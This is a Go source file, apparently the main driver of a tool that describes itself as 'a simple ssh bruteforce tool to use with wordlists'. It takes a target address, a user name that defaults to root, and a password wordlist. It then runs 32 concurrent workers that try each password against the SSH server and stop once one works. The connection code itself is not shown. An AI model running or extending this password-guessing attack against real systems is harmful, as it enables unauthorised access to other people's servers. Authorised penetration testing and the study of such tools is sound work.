// TODO
// Instead of options for username etc have it in args in the form user@adress:port
// If ssh password auth is not supported, detect it and stop the program

// Package main implements a simple ssh bruteforce tool to use with wordlists.
package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"
	"sync"
	"time"

	"github.com/UlisseMini/clean"
)

var (
	wordlist = flag.String("w", "wordlist.txt", "indicate wordlist file to use")
	addr     = flag.String("a", "127.0.0.1:22",
		"indicate the target address")

	user = flag.String("u", "root", "indicate user to use")

	timeout = flag.Duration("t", 300*time.Millisecond,
		"Set the timeout depending on the latency between you and the remote host.")

	debug   = flag.Bool("d", false, "debug mode, print logs to stderr")
	workers = flag.Int("g", 32,
		"how meny goroutines should be making concurrent connections")
)

func main() {
	defer clean.Do()

	flag.Parse()
	// Print options used.
	fmt.Printf("target: %s@%s\n", *user, *addr)
	fmt.Printf("timeout: %v\n", timeout)
	fmt.Printf("wordlist: %s\n", *wordlist)

	if *debug {
		log.SetOutput(os.Stderr)
	}

	passFile, err := os.Open(*wordlist)
	if err != nil {
		fmt.Printf("Error opening wordlist: %v\n", err)
		return
	}

	// add closing the file to global cleanup
	clean.Add(func() {
		passFile.Close()
	}, "passFile")

	scanner := bufio.NewScanner(passFile)

	// create factory
	fac := &sshFactory{
		user:    *user,
		timeout: *timeout,
		addr:    *addr,
	}

	// Get finished tasks from the finished channel
	finished := make(chan task)
	go func() {
		log.Println("starting to recv from finished")
		for t := range finished {
			// t.output will terminate the progam if it gets the right password
			t.output()
		}
		log.Println("done recv from finished")
	}()

	lines := make(chan string)
	var wg sync.WaitGroup
	// create goroutine workers
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for line := range lines {
				log.Printf("create task for %q", line)
				t := fac.make(line)

				t.do()
				finished <- t
			}
		}()
	}

	for scanner.Scan() {
		line := scanner.Text()
		log.Printf("sending %q over lines (chan string)", line)
		lines <- line
	}
	close(lines)

	// wait for the tasks to be done
	log.Println("waiting for WaitGroup")
	wg.Wait()

	log.Println("closing finished")
	close(finished) // all tasks are finished so close finished.
}
